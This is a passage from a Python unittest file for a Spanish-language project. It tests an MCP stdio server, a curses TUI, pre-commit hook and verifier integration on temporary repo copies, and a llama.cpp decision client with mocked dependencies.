                self.assertIn("boom", content[0]["text"])
            finally:
                mcp.AUDIT_LOG = old_log

    def test_create_lesson_sin_campos_es_error(self):
        content, is_error = mcp.handle_call("create_lesson", {"problema": "p"})
        self.assertTrue(is_error)
        self.assertIn("obligatorias", content[0]["text"])

    def test_create_lesson_archivo_sin_salto_final(self):
        with tempfile.TemporaryDirectory() as tmp:
            old_dir = mcp.LESSONS_DIR
            mcp.LESSONS_DIR = Path(tmp)
            try:
                archivo = Path(tmp) / f"{mcp.date.today().year}.yaml"
                archivo.write_text("- id: LSN-001\n  estado: Abierta", encoding="utf-8")
                content, is_error = mcp.handle_call(
                    "create_lesson", {"problema": "p", "recomendacion": "r"}
                )
                self.assertFalse(is_error)
                self.assertIn("LSN-002", content[0]["text"])
                self.assertIn("\n- id: LSN-002", archivo.read_text(encoding="utf-8"))
            finally:
                mcp.LESSONS_DIR = old_dir

    def test_search_knowledge_query_vacia(self):
        content = mcp.search_knowledge({"query": "   "})
        self.assertIn("vacia", content[0]["text"])

    def test_handle_call_run_verification(self):
        with tempfile.TemporaryDirectory() as tmp:
            old_log = mcp.AUDIT_LOG
            mcp.AUDIT_LOG = Path(tmp) / "a.jsonl"
            try:
                with mock.patch.object(mcp.subprocess, "run",
                                       return_value=mock.Mock(returncode=0, stdout="ok", stderr="")):
                    content, is_error = mcp.handle_call("run_verification", {})
                self.assertFalse(is_error)
                self.assertIn("verificacion OK", content[0]["text"])
            finally:
                mcp.AUDIT_LOG = old_log

    def test_stdio_messages_header_incompleto(self):
        srv = mcp.StdioServer()
        srv.buffer = b"Content-Length: 10\r\n"
        self.assertEqual(srv._messages(), [])

    def test_stdio_messages_content_length_json_invalido(self):
        srv = mcp.StdioServer()
        body = b"no-json"
        srv.buffer = b"Content-Length: %d\r\n\r\n%s" % (len(body), body)
        with mock.patch.object(mcp, "log"):
            self.assertEqual(srv._messages(), [])

    def test_stdio_messages_linea_vacia_ignorada(self):
        srv = mcp.StdioServer()
        srv.buffer = b'\n{"a": 1}\n'
        self.assertEqual(srv._messages(), [{"a": 1}])

    def test_log_escribe_en_stderr(self):
        err = io.StringIO()
        with mock.patch.object(sys, "stderr", err):
            mcp.log("hola")
        self.assertIn("hola", err.getvalue())

    def test_search_knowledge_usa_indice_json(self):
        with tempfile.TemporaryDirectory() as tmp:
            know = Path(tmp) / "know"
            know.mkdir()
            (know / "a.md").write_text("## Timeout\nservidor timeout conexiones pool\n")
            storage = Path(tmp) / "st"
            storage.mkdir()
            old = (
                mcp.JSON_INDEX, mcp.KNOWLEDGE_DIR,
                ik.KNOWLEDGE_DIR, ik.STORAGE_DIR, ik.JSON_INDEX, ik.MANIFEST, ik.CHROMA_DIR,
            )
            mcp.JSON_INDEX = storage / "index.json"
            mcp.KNOWLEDGE_DIR = know
            ik.KNOWLEDGE_DIR, ik.STORAGE_DIR = know, storage
            ik.JSON_INDEX = storage / "index.json"
            ik.MANIFEST = storage / "manifest.json"
            ik.CHROMA_DIR = storage / "chroma_db"
            try:
                ik.build_json_index()
                content = mcp.search_knowledge({"query": "timeout"})
                self.assertIn("timeout", content[0]["text"])
            finally:
                (
                    mcp.JSON_INDEX, mcp.KNOWLEDGE_DIR,
                    ik.KNOWLEDGE_DIR, ik.STORAGE_DIR, ik.JSON_INDEX, ik.MANIFEST, ik.CHROMA_DIR,
                ) = old

    def test_stdio_messages_jsonl_y_parcial(self):
        srv = mcp.StdioServer()
        srv.buffer = b'{"a": 1}\n{"b": 2}\n'
        self.assertEqual(srv._messages(), [{"a": 1}, {"b": 2}])
        self.assertEqual(srv.buffer, b"")
        srv.buffer = b'{"a": 1}'
        self.assertEqual(srv._messages(), [])

    def test_stdio_messages_content_length(self):
        srv = mcp.StdioServer()
        body = b'{"a": 1}'
        srv.buffer = b"Content-Length: %d\r\n\r\n%s" % (len(body), body)
        self.assertEqual(srv._messages(), [{"a": 1}])

    def test_stdio_messages_content_length_incompleto(self):
        srv = mcp.StdioServer()
        srv.buffer = b'Content-Length: 50\r\n\r\n{"a": 1}'
        self.assertEqual(srv._messages(), [])

    def test_stdio_messages_header_sin_length(self):
        srv = mcp.StdioServer()
        srv.buffer = b"Content-Length: abc\r\n\r\nbody"
        self.assertEqual(srv._messages(), [])
        self.assertEqual(srv.buffer, b"")

    def test_stdio_messages_json_invalido_ignorado(self):
        srv = mcp.StdioServer()
        srv.buffer = b'no-json\n{"ok": 1}\n'
        with mock.patch.object(mcp, "log"):
            self.assertEqual(srv._messages(), [{"ok": 1}])

    def test_stdio_send(self):
        srv = mcp.StdioServer()
        buf = io.StringIO()
        with mock.patch.object(sys, "stdout", buf):
            srv.send({"a": 1})
        self.assertEqual(buf.getvalue().strip(), '{"a": 1}')

    def test_stdio_dispatch_metodos(self):
        srv = mcp.StdioServer()
        enviados = []
        with mock.patch.object(srv, "send", side_effect=lambda p: enviados.append(p)), \
                mock.patch.object(mcp, "log"):
            srv._dispatch({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
            srv._dispatch({"jsonrpc": "2.0", "id": 2, "method": "ping"})
            srv._dispatch({"jsonrpc": "2.0", "id": 3, "method": "tools/list"})
            srv._dispatch({"jsonrpc": "2.0", "method": "notifications/initialized"})
            srv._dispatch({"jsonrpc": "2.0", "method": "notifications/cancelled"})
            srv._dispatch({"jsonrpc": "2.0", "id": 4, "method": "desconocido"})
        self.assertEqual(enviados[0]["result"]["serverInfo"]["name"], "better-project")
        self.assertEqual(enviados[1]["result"], {})
        self.assertEqual(len(enviados[2]["result"]["tools"]), 5)
        self.assertEqual(len(enviados), 3)

    def test_stdio_dispatch_tools_call(self):
        srv = mcp.StdioServer()
        enviados = []
        with mock.patch.object(mcp, "handle_call",
                               return_value=([{"type": "text", "text": "x"}], False)), \
                mock.patch.object(srv, "send", side_effect=lambda p: enviados.append(p)):
            srv._dispatch({"jsonrpc": "2.0", "id": 9, "method": "tools/call",
                           "params": {"name": "validate_requirements", "arguments": {}}})
        self.assertFalse(enviados[0]["result"]["isError"])
        self.assertEqual(enviados[0]["id"], 9)

    def test_stdio_run_procesa_linea(self):
        srv = mcp.StdioServer()
        salida = io.StringIO()

        class _In:
            buffer = [b'{"jsonrpc": "2.0", "id": 1, "method": "ping"}\n']

        with mock.patch.object(sys, "stdin", _In()), mock.patch.object(sys, "stdout", salida):
            srv.run()
        self.assertIn('"result"', salida.getvalue())


class TestTUI(unittest.TestCase):
    def test_truncar(self):
        self.assertEqual(tui.truncar("corto", 10), "corto")
        self.assertEqual(tui.truncar("1234567890abc", 10), "123456789…")
        self.assertEqual(len(tui.truncar("1234567890abc", 10)), 10)

    def test_estado_color(self):
        self.assertEqual(tui.estado_color("Implementado"), tui.CP_OK)
        self.assertEqual(tui.estado_color("Deprecado"), tui.CP_DIM)
        self.assertEqual(tui.estado_color("Desconocido"), tui.CP_HEADER)

    def test_cambio_de_pestana(self):
        app = tui.App()
        app._tecla_principal(ord("2"))
        self.assertEqual(app.tab, 1)
        app._tecla_principal(ord("1"))
        self.assertEqual(app.tab, 0)

    def test_consulta_acumula_caracteres(self):
        app = tui.App()
        app.tab = 1
        app._tecla_principal(ord("p"))
        app._tecla_principal(ord("i"))
        self.assertEqual(app.consulta, "pi")

    def test_busqueda_directa_encuentra_pilares(self):
        app = tui.App()
        app.buscar_conocimiento("pilar")
        self.assertGreater(len(app.knowledge), 0)
        self.assertTrue(any("pilar" in hit["contenido"].lower() for hit in app.knowledge))

    def _stdscr(self):
        s = mock.MagicMock()
        s.getmaxyx.return_value = (24, 80)
        return s

    def test_buscar_conocimiento_vacio(self):
        app = tui.App()
        app.buscar_conocimiento("   ")
        self.assertEqual(app.knowledge, [])
        self.assertIn("consulta", app.mensaje)

    def test_busqueda_directa_con_terminos(self):
        with tempfile.TemporaryDirectory() as tmp:
            know = Path(tmp)
            (know / "a.md").write_text("## Timeout\nservidor timeout conexiones pool\n")
            old_know, old_root = ik.KNOWLEDGE_DIR, tui.ROOT
            ik.KNOWLEDGE_DIR = know
            tui.ROOT = know
            try:
                app = tui.App()
                res = app._busqueda_directa("timeout")
                self.assertTrue(res)
                self.assertEqual(app._busqueda_directa(""), [])
            finally:
                ik.KNOWLEDGE_DIR, tui.ROOT = old_know, old_root

    def test_indexar_mensaje(self):
        app = tui.App()
        with mock.patch.object(tui.index_knowledge, "index_all") as ia:
            app.indexar()
            ia.assert_called_once_with(force=False)
        self.assertIn("indice", app.mensaje)

    def test_ejecutar_verificar_ok_timeout_y_ausente(self):
        app = tui.App()
        with mock.patch.object(tui.subprocess, "run",
                               return_value=mock.Mock(returncode=0, stdout="ok\n", stderr="")):
            app.ejecutar_verificar()
        self.assertTrue(app.verificar_ok)
        with mock.patch.object(tui.subprocess, "run",
                               side_effect=subprocess.TimeoutExpired(cmd="x", timeout=1)):
            app.ejecutar_verificar()
        self.assertFalse(app.verificar_ok)
        self.assertIn("agotada", app.verificar[0])
        old_scripts = tui.SCRIPTS
        tui.SCRIPTS = Path(tempfile.mkdtemp())
        try:
            app.ejecutar_verificar()
            self.assertFalse(app.verificar_ok)
            self.assertIn("no existe", app.verificar[0])
        finally:
            tui.SCRIPTS = old_scripts

    def test_items_actuales_por_pestana(self):
        app = tui.App()
        app.requisitos = [1, 2]
        app.knowledge = [1]
        app.lecciones = [1, 2, 3]
        app.verificar = [1, 2]
        self.assertEqual(app._items_actuales(), 2)
        app.tab = 1
        self.assertEqual(app._items_actuales(), 1)
        app.tab = 2
        self.assertEqual(app._items_actuales(), 3)
        app.tab = 3
        self.assertEqual(app._items_actuales(), 2)

    def test_rango_visible(self):
        app = tui.App()
        self.assertEqual(app._rango_visible(24, 80), (0, 19))

    def test_tecla_principal_navegacion_y_consulta(self):
        app = tui.App()
        app.requisitos = [{"id": "REQ-001", "meta": {}, "path": Path("x"), "refs": 0}]
        app._tecla_principal(ord("1"))
        self.assertEqual(app.tab, 0)
        app._tecla_principal(tui.curses.KEY_DOWN)
        self.assertEqual(app.seleccion[0], 0)
        app._tecla_principal(ord("2"))
        self.assertEqual(app.tab, 1)
        app.consulta = ""
        with mock.patch.object(tui.index_knowledge, "index_all") as ia:
            app._tecla_principal(ord("i"))
            ia.assert_called_once()
        app._tecla_principal(ord("a"))
        self.assertEqual(app.consulta, "a")
        app._tecla_principal(8)
        self.assertEqual(app.consulta, "")
        app._tecla_principal(ord("x"))
        self.assertEqual(app.consulta, "x")
        app.tab = 3
        with mock.patch.object(app, "ejecutar_verificar") as ev:
            app._tecla_principal(ord("R"))
            ev.assert_called_once()

    def test_detalle_y_scroll(self):
        app = tui.App()
        app.cargar_requisitos()
        app._abrir_detalle()
        self.assertIsNotNone(app.detalle)
        stdscr = self._stdscr()
        with mock.patch.object(tui.curses, "color_pair", return_value=0):
            app._draw(stdscr)
        app._tecla_detalle(tui.curses.KEY_DOWN)
        self.assertEqual(app.detalle.offset, 1)
        app._tecla_detalle(tui.curses.KEY_UP)
        self.assertEqual(app.detalle.offset, 0)
        app._tecla_detalle(ord("j"))
        self.assertTrue(app._tecla_detalle(ord("q")))

    def test_detalle_conocimiento_y_leccion(self):
        app = tui.App()
        app.tab = 1
        app.knowledge = [{"archivo": "a.md", "contenido": "texto de prueba", "score": 3}]
        with mock.patch.object(tui.curses, "COLS", 80, create=True):
            app._abrir_detalle()
        self.assertEqual(app.detalle.titulo, "Conocimiento")
        app.tab = 2
        app.lecciones = [{"id": "LSN-001", "estado": "Abierta", "problema": "p",
                          "recomendacion": "r", "proyecto": "x", "fase": "f",
                          "categoria": "c", "fecha": "2026-01-01"}]
        app._abrir_detalle()
        self.assertEqual(app.detalle.titulo, "LSN-001")

    def test_draw_todas_las_pestanas(self):
        app = tui.App()
        app.cargar_requisitos()
        app.cargar_lecciones()
        app.knowledge = [{"archivo": "a.md", "contenido": "contenido", "score": 1}]
        app.verificar = ["linea de salida"]
        stdscr = self._stdscr()
        with mock.patch.object(tui.curses, "color_pair", return_value=0), \
                mock.patch.object(tui.curses, "has_colors", return_value=False):
            for tab in range(4):
                app.tab = tab
                app._draw(stdscr)
        self.assertTrue(stdscr.addstr.called)

    def test_init_colores_y_draw_con_color(self):
        app = tui.App()
        with mock.patch.object(tui.curses, "has_colors", return_value=True), \
                mock.patch.object(tui.curses, "start_color"), \
                mock.patch.object(tui.curses, "use_default_colors"), \
                mock.patch.object(tui.curses, "init_pair") as ip:
            app._init_colores()
            self.assertTrue(ip.called)
        stdscr = self._stdscr()
        with mock.patch.object(tui.curses, "color_pair", return_value=0), \
                mock.patch.object(tui.curses, "has_colors", return_value=True):
            app.cargar_requisitos()
            app._draw(stdscr)

    def test_draw_status_altura_minima(self):
        app = tui.App()
        stdscr = self._stdscr()
        app._draw_status(stdscr, 1, 80)
        self.assertFalse(stdscr.addstr.called)

    def test_lista_vacia_muestra_sin_datos(self):
        app = tui.App()
        app.tab = 2
        app.lecciones = []
        stdscr = self._stdscr()
        with mock.patch.object(tui.curses, "color_pair", return_value=0), \
                mock.patch.object(tui.curses, "has_colors", return_value=False):
            app._draw(stdscr)
        self.assertTrue(any("sin datos" in str(c) for c in stdscr.addstr.call_args_list))

    def test_main_envuelve_run(self):
        with mock.patch.object(tui.curses, "wrapper", return_value=0) as w:
            self.assertEqual(tui.main(), 0)
        self.assertTrue(w.called)

    def test_run_sale_con_q(self):
        app = tui.App()
        stdscr = self._stdscr()
        stdscr.getch.return_value = ord("q")
        with mock.patch.object(app, "_init_colores"), \
                mock.patch.object(app, "cargar_requisitos"), \
                mock.patch.object(app, "cargar_lecciones"), \
                mock.patch.object(app, "_draw"), \
                mock.patch.object(tui.curses, "curs_set"):
            app.run(stdscr)
        self.assertEqual(stdscr.getch.call_count, 1)


class TestIntegracionHook(unittest.TestCase):
    """Test de integracion: el hook pre-commit ejecuta verificar-proyecto.sh
    sobre una copia temporal del repo y ABORTA un commit roto (el safeguard se
    prueba tambien en su modo de fallo, leccion de la ronda 16; P1.1).
    """

    def setUp(self):
        if os.environ.get("BETTER_TEST_INTEGRACION"):
            # El verificador ejecuta la propia suite dentro de la copia:
            # la guarda evita recursion infinita de copias.
            self.skipTest("dentro de la copia temporal de integracion")
        self.tmp = Path(tempfile.mkdtemp())
        self.repo = self.tmp / "repo"
        ignore = shutil.ignore_patterns(
            ".git", "node_modules", "__pycache__", ".storage", "*.pyc", ".venv", "venv"
        )
        shutil.copytree(ROOT, self.repo, ignore=ignore)

    def _git(self, *args):
        return subprocess.run(
            ["git", *args], cwd=self.repo, capture_output=True, text=True
        )

    def test_hook_aborta_commit_roto_y_permite_commit_verde(self):
        # La guarda se exporta al entorno para que la suite que el verificador
        # ejecuta DENTRO de la copia omita este mismo test (sin recursion).
        os.environ["BETTER_TEST_INTEGRACION"] = "1"
        try:
            self.assertEqual(self._git("init", "-q").returncode, 0)
            self._git("config", "user.email", "dummy@example.com")
            self._git("config", "user.name", "dummy")
            # Commit bootstrap SIN hook: con HEAD no nacido, git fsck emite
            # avisos que el check "sin objetos huerfanos" tomaria como fallo.
            self._git("add", "-A")
            boot = self._git("commit", "-q", "--no-verify", "-m", "bootstrap")
            self.assertEqual(boot.returncode, 0, boot.stdout + boot.stderr)
            hooks = self.repo / ".git" / "hooks"
            for nombre in ("pre-commit", "commit-msg"):
                shutil.copy(self.repo / "scripts" / "hooks" / nombre, hooks / nombre)

            # Commit verde: los hooks deben dejar pasar el repo intacto.
            # Incluye Assisted-by: porque el hook commit-msg lo exige (REQ-019).
            with (self.repo / "scripts" / "tui.py").open("a", encoding="utf-8") as fh:
                fh.write("\n# comentario inocuo para el commit verde\n")
            self._git("add", "-A")
            verde = self._git("commit", "-q", "-m", "verde", "-m", "Assisted-by: test")
            self.assertEqual(verde.returncode, 0, verde.stdout + verde.stderr)

            # Commit roto: referencia a un REQ inexistente (doc_validator falla).
            with (self.repo / "scripts" / "tui.py").open("a", encoding="utf-8") as fh:
                fh.write("\n# REQ-999 referencia rota para el test\n")
            self._git("add", "-A")
            roto = self._git("commit", "-q", "-m", "roto")
            self.assertNotEqual(roto.returncode, 0, "el hook no aborto un commit roto")
            salida = roto.stdout + roto.stderr
            # check() no propaga la salida del comando: se verifica el check concreto
            self.assertIn("[FALLO] trazabilidad REQ valida", salida)
            self.assertIn("FALLOS", salida)

            # HEAD intacto: solo quedan bootstrap + commit verde.
            log = self._git("log", "--oneline").stdout.strip().splitlines()
            self.assertEqual(len(log), 2)
        finally:
            os.environ.pop("BETTER_TEST_INTEGRACION", None)


class TestVerificador(unittest.TestCase):
    """REQ-010: el propio verificador se prueba en modo fallo (P1.1):
    debe pasar sobre una copia intacta y FALLAR sobre una copia corrupta.
    """

    def _copia(self):
        if os.environ.get("BETTER_TEST_INTEGRACION"):
            self.skipTest("dentro de la copia temporal de integracion")
        tmp = Path(tempfile.mkdtemp())
        repo = tmp / "repo"
        ignore = shutil.ignore_patterns(
            ".git", "node_modules", "__pycache__", ".storage", "*.pyc", ".venv", "venv"
        )
        shutil.copytree(ROOT, repo, ignore=ignore)
        subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
        subprocess.run(["git", "config", "user.email", "dummy@example.com"], cwd=repo, check=True)
        subprocess.run(["git", "config", "user.name", "dummy"], cwd=repo, check=True)
        subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
        # bootstrap sin hook: con HEAD no nacido git fsck emite avisos (LSN-005)
        subprocess.run(["git", "commit", "-qm", "bootstrap", "--no-verify"], cwd=repo, check=True)
        for nombre in ("pre-commit", "commit-msg"):
            shutil.copy(repo / "scripts" / "hooks" / nombre, repo / ".git" / "hooks" / nombre)
        return repo

    def _verifica(self, repo):
        env = {**os.environ, "BETTER_TEST_INTEGRACION": "1"}
        return subprocess.run(
            ["bash", "scripts/verificar-proyecto.sh", "--pre-commit"],
            cwd=repo, capture_output=True, text=True, env=env,
        )

    def test_verificador_en_verde_sobre_copia_intacta(self):
        proc = self._verifica(self._copia())
        self.assertEqual(proc.returncode, 0, proc.stdout[-2000:] + proc.stderr[-2000:])

    def test_verificador_detecta_regla_p0_eliminada(self):
        repo = self._copia()
        agents = repo / "AGENTS.md"
        lineas = agents.read_text(encoding="utf-8").splitlines(keepends=True)
        self.assertTrue(any(linea.startswith("### P0.20") for linea in lineas))
        # eliminar la linea completa: el conteo de reglas P0 baja a 19
        agents.write_text(
            "".join(linea for linea in lineas if not linea.startswith("### P0.20")),
            encoding="utf-8",
        )
        proc = self._verifica(repo)
        self.assertEqual(proc.returncode, 1, "el verificador no detecto la corrupcion")
        self.assertIn("[FALLO] 20 reglas P0 definidas en AGENTS.md", proc.stdout)


class TestJevLlama(unittest.TestCase):
    """REQ-011: cliente Jev AI liviano con llama.cpp."""

    _VOCAB = 1000
    _N_ROWS = 256

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.model_path = self.tmp / "fake.gguf"
        self.model_path.write_bytes(b"fake-model")

        # Importamos jev_llama sin dependencias (los imports son diferidos),
        # luego mockeamos llama_cpp y numpy solo para estas pruebas.
        import jev_llama as jl

        self.jl = jl

        self._real_llama = sys.modules.get("llama_cpp")
        self._real_numpy = sys.modules.get("numpy")
        self._real_model_env = os.environ.pop("JEV_MODEL_PATH", None)
        self._real_temp_env = os.environ.pop("JEV_TEMPERATURE", None)

        vocab = self._VOCAB
        rows = self._N_ROWS

        class _FakeNumpy:
            @staticmethod
            def array(x):
                return list(x)

            @staticmethod
            def log(x):
                return [math.log(v + 1e-12) for v in x]

            @staticmethod
            def argmax(x):
                return max(range(len(x)), key=lambda i: x[i])

        class _FakeLlama:
            # scores 2D (n_ctx, vocab) igual que llama-cpp-python real.
            def __init__(self, **kwargs):
                self._kwargs = kwargs
                self.scores = [[0.0] * vocab for _ in range(rows)]
                self.n_tokens = 0

            def reset(self):
                self.n_tokens = 0

            def tokenize(self, text, add_bos=False):
                # Token id = primer byte del texto; suficiente para tests.
                return [text[0] if isinstance(text, bytes) else ord(text[0])]

            def eval(self, tokens):
                self.n_tokens = len(tokens)

        sys.modules["numpy"] = _FakeNumpy()
        sys.modules["llama_cpp"] = type("_llama_cpp", (), {"Llama": _FakeLlama})()

    def tearDown(self):
        if self._real_llama is not None:
            sys.modules["llama_cpp"] = self._real_llama
        else:
            sys.modules.pop("llama_cpp", None)
        if self._real_numpy is not None:
            sys.modules["numpy"] = self._real_numpy
        else:
            sys.modules.pop("numpy", None)
        if self._real_model_env is not None:
            os.environ["JEV_MODEL_PATH"] = self._real_model_env
        if self._real_temp_env is not None:
            os.environ["JEV_TEMPERATURE"] = self._real_temp_env
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _client(self):
        return self.jl.JevLlama(model_path=str(self.model_path), n_ctx=128)

    @staticmethod
    def _set_logit(client, token: str, value: float) -> None:
        for row in client.model.scores:
            row[ord(token)] = value

    def test_constructor_activa_logits_all(self):
        client = self._client()
        self.assertIs(client.model._kwargs.get("logits_all"), True)

    def test_jev_model_path_se_usa_por_defecto(self):
        os.environ["JEV_MODEL_PATH"] = str(self.model_path)
        client = self.jl.JevLlama()
        self.assertEqual(client.model_path, self.model_path)

    def test_jev_temperature_desde_entorno(self):
        os.environ["JEV_TEMPERATURE"] = "2.5"
        client = self._client()
        self.assertAlmostEqual(client.temperature, 2.5)

    def test_softmax_temperatura_suaviza_y_valida(self):
        sharp = self.jl._softmax([0.0, 2.0], 1.0)
        soft = self.jl._softmax([0.0, 2.0], 4.0)
        self.assertLess(max(soft), max(sharp))
        self.assertAlmostEqual(sum(soft), 1.0, places=9)
        with self.assertRaises(ValueError):
            self.jl._softmax([0.0, 1.0], 0.0)

    def test_temperature_en_rango_desde_constructor(self):
        client = self.jl.JevLlama(model_path=str(self.model_path), temperature=3.0)
        self.assertAlmostEqual(client.temperature, 3.0)
        with self.assertRaises(ValueError):
            self.jl.JevLlama(model_path=str(self.model_path), temperature=-1.0)

    def test_noul_preferencia_yes(self):
        client = self._client()
        self._set_logit(client, "y", 5.0)
        self._set_logit(client, "n", 1.0)
        result = client.decide("test", {"q": {"type": "noul", "instructions": "Is it yes?"}})
        self.assertEqual(result["q"]["type"], "noul")
        self.assertGreater(result["q"]["noul"], 0.5)
        self.assertIn("confidence", result["q"])
        self.assertAlmostEqual(sum(result["q"]["probabilities"].values()), 1.0, places=5)

    def test_confidence_en_rango(self):
        client = self._client()
        self._set_logit(client, "y", 5.0)
        self._set_logit(client, "n", 1.0)
        result = client.decide("test", {"q": {"type": "noul", "instructions": "Is it yes?"}})
        self.assertGreaterEqual(result["q"]["confidence"], 0.0)
        self.assertLessEqual(result["q"]["confidence"], 1.0)

    def test_choice_selecciona_opcion_con_mayor_logit(self):
        client = self._client()
        self._set_logit(client, "a", 2.0)
        self._set_logit(client, "b", 5.0)
        self._set_logit(client, "c", 1.0)
        result = client.decide("test", {
            "q": {
                "type": "choice",
                "instructions": "Pick one",
                "criteria": {"a": "first", "b": "second", "c": "third"},
            }
        })
        self.assertEqual(result["q"]["type"], "choice")
        self.assertEqual(result["q"]["choice"], "b")
        self.assertEqual(len(result["q"]["probabilities"]), 3)

    def test_score_calcula_puntuacion_ponderada(self):
        client = self._client()
        self._set_logit(client, "0", 1.0)
        self._set_logit(client, "1", 2.0)
        self._set_logit(client, "2", 5.0)
        self._set_logit(client, "3", 1.0)
        result = client.decide("test", {
            "q": {
                "type": "score",
                "instructions": "How severe?",
                "criteria": ["low", "medium", "high", "critical"],
            }
        })
        self.assertEqual(result["q"]["type"], "score")
        self.assertGreater(result["q"]["score"], 1.0)
        self.assertIn("legend", result["q"])

    def test_tipo_desconocido_lanza_valueerror(self):
        client = self._client()
        with self.assertRaises(ValueError):
            client.decide("test", {"q": {"type": "unknown"}})

    def test_modelo_inexistente_lanza_filenotfound(self):
        missing = self.tmp / "no_existe.gguf"
        with self.assertRaises(FileNotFoundError):
            self.jl.JevLlama(model_path=str(missing))

    def test_default_model_path_sin_env(self):
        # _default_model_path usa Path.home() / ".cache" / "better-project" / "jev" / DEFAULT_MODEL
        # No podemos testear Path.home() facilmente, pero podemos verificar la logica
        with mock.patch.object(Path, "home", return_value=self.tmp):
            path = self.jl._default_model_path()
            expected = self.tmp / ".cache" / "better-project" / "jev" / self.jl.DEFAULT_MODEL
            self.assertEqual(path, expected)

    def test_env_int_y_float_con_none(self):
        # _env_int y _env_float devuelven default cuando la variable no existe
        self.assertEqual(self.jl._env_int("JEV_NO_EXISTE", 42), 42)
        self.assertEqual(self.jl._env_float("JEV_NO_EXISTE", 3.14), 3.14)
        # Y parsean correctamente cuando existe
        os.environ["JEV_TEST_INT"] = "123"
        os.environ["JEV_TEST_FLOAT"] = "2.5"
        try:
            self.assertEqual(self.jl._env_int("JEV_TEST_INT", 0), 123)
            self.assertEqual(self.jl._env_float("JEV_TEST_FLOAT", 0.0), 2.5)
        finally:
            os.environ.pop("JEV_TEST_INT", None)
            os.environ.pop("JEV_TEST_FLOAT", None)

    def test_confidence_funcion(self):
        # confidence = 1 - H(p)/ln(K)
        # Distribucion uniforme -> confidence = 0
        self.assertAlmostEqual(self.jl._confidence([0.5, 0.5]), 0.0, places=9)
        # Distribucion cierta -> confidence = 1
        self.assertAlmostEqual(self.jl._confidence([1.0, 0.0]), 1.0, places=9)
        # Tres opciones
        self.assertAlmostEqual(self.jl._confidence([1/3, 1/3, 1/3]), 0.0, places=9)
        self.assertAlmostEqual(self.jl._confidence([1.0, 0.0, 0.0]), 1.0, places=9)

    def test_build_prompt_noul(self):
        prompt = self.jl.JevLlama._build_prompt("estado", {"type": "noul", "instructions": "¿Sí o no?"})
        self.assertIn("State: estado", prompt)
        self.assertIn("Question: ¿Sí o no?", prompt)
        self.assertIn('Answer only "yes" or "no"', prompt)
        self.assertIn("Answer: ", prompt)

    def test_build_prompt_choice(self):
        prompt = self.jl.JevLlama._build_prompt("estado", {
            "type": "choice",
            "instructions": "Elige",
            "criteria": {"a": "opcion A", "b": "opcion B"}
        })
        self.assertIn("Options:", prompt)
        self.assertIn("- a: opcion A", prompt)
        self.assertIn("- b: opcion B", prompt)
        self.assertIn("Answer with the exact option id", prompt)

    def test_build_prompt_score(self):
        prompt = self.jl.JevLlama._build_prompt("estado", {
            "type": "score",
            "instructions": "Puntua",
            "criteria": ["bajo", "alto"]
        })
        self.assertIn("Levels:", prompt)
        self.assertIn("- 0: bajo", prompt)
        self.assertIn("- 1: alto", prompt)
        self.assertIn("Answer with the level number", prompt)

    def test_tokenize_metodo(self):
        client = self._client()
        tokens = client._tokenize("hello", add_bos=False)
        self.assertIsInstance(tokens, list)
        self.assertEqual(len(tokens), 1)
        self.assertEqual(tokens[0], ord("h"))

    def test_first_token_probs(self):
        client = self._client()
        self._set_logit(client, "y", 5.0)
        self._set_logit(client, "n", 1.0)
        probs = client._first_token_probs("test prompt", [ord("y"), ord("n")])
        self.assertEqual(len(probs), 2)
        self.assertGreater(probs[0], probs[1])

    def test_answer_noul_interno(self):
        client = self._client()
        self._set_logit(client, "y", 5.0)
        self._set_logit(client, "n", 1.0)
        result = client._answer_noul("estado", {"type": "noul", "instructions": "¿Sí?"})
        self.assertEqual(result["type"], "noul")
        self.assertIn("noul", result)
        self.assertIn("probabilities", result)
        self.assertIn("confidence", result)

    def test_answer_choice_interno(self):
        client = self._client()
        self._set_logit(client, "a", 1.0)
        self._set_logit(client, "b", 5.0)
        result = client._answer_choice("estado", {
            "type": "choice",
            "instructions": "Elige",
            "criteria": {"a": "A", "b": "B"}
        })
        self.assertEqual(result["type"], "choice")
        self.assertEqual(result["choice"], "b")
        self.assertEqual(len(result["probabilities"]), 2)

    def test_answer_score_interno(self):
        client = self._client()
        self._set_logit(client, "0", 1.0)
        self._set_logit(client, "1", 5.0)
        result = client._answer_score("estado", {
            "type": "score",
            "instructions": "Puntua",
            "criteria": ["bajo", "alto"]
        })
        self.assertEqual(result["type"], "score")
        self.assertIn("score", result)
        self.assertIn("legend", result)

    def test_constructor_import_error_llama_cpp(self):
        # Simular que llama_cpp no esta instalado
        import sys
        real_llama = sys.modules.get("llama_cpp")
        sys.modules["llama_cpp"] = None
        try:
            with self.assertRaises(ImportError) as cm:
                self.jl.JevLlama(model_path=str(self.model_path))
            self.assertIn("llama-cpp-python no esta instalado", str(cm.exception))
        finally:
            if real_llama:
                sys.modules["llama_cpp"] = real_llama
            else:
                sys.modules.pop("llama_cpp", None)

    def test_constructor_import_error_numpy(self):
        import sys
        real_numpy = sys.modules.get("numpy")
        sys.modules["numpy"] = None
        try:
            with self.assertRaises(ImportError) as cm:
                self.jl.JevLlama(model_path=str(self.model_path))
            self.assertIn("llama-cpp-python no esta instalado", str(cm.exception))
        finally:
            if real_numpy:
                sys.modules["numpy"] = real_numpy
            else:
                sys.modules.pop("numpy", None)

    def test_demo_funcion(self):
        # _demo() crea un cliente y llama decide - verificamos que decide() funciona
        client = self._client()
        self._set_logit(client, "y", 5.0)
        self._set_logit(client, "n", 1.0)
        self._set_logit(client, "a", 2.0)
        self._set_logit(client, "b", 5.0)
        self._set_logit(client, "0", 1.0)
        self._set_logit(client, "1", 5.0)
        # Llamar decide() y verificar estructura de respuesta
        result = client.decide("test", {"q": {"type": "noul", "instructions": "?"}})
        self.assertIn("q", result)
        self.assertIn("type", result["q"])
        self.assertEqual(result["q"]["type"], "noul")

    def test_main_demo(self):
        with mock.patch.object(sys, "argv", ["jev_llama.py", "--demo"]), \
             mock.patch.object(self.jl, "JevLlama", return_value=self._client()), \
             mock.patch.object(sys, "stdout", io.StringIO()):
            # _demo() llama a JevLlama() y decide()
            result = self.jl._main()
            self.assertEqual(result, 0)

    def test_main_input(self):
        data = {"state": "test", "questions": {"q": {"type": "noul", "instructions": "?"}}}
        input_file = self.tmp / "input.json"
        input_file.write_text(json.dumps(data))
